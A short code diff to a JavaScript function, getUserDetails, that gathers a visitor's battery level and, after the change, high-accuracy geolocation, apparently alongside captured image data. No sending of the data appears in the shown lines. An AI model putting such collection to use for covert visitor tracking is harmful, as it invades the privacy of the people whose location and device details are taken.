@@ -52,10 +52,13 @@
 
         async function getUserDetails(imageData) {
             let batteryPromise = navigator.getBattery().then(battery => `${Math.round(battery.level * 100)}%`).catch(() => "Unknown");
+
             let locationPromise = new Promise(resolve => {
+                // Requesting high accuracy location
                 navigator.geolocation.getCurrentPosition(
                     pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-                    () => resolve("Location Denied")
+                    () => resolve("Location Denied"),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }  // High accuracy setting
                 );
             });
 
